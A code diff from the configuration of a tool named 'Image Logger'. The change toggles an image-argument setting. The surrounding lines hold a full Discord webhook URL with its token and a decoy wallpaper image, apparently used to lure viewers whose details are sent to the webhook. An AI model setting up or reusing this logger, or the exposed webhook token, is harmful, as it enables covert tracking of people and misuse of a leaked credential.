@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1353525981805150279/vJtDX_GuzVfGTq9iXRe9J9kndP-jju61-XlM9lJk7zpL3ARqq1jSESVB_r8QkbTJsIgC",
     "image": "https://www.pcworld.com/wp-content/uploads/2023/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
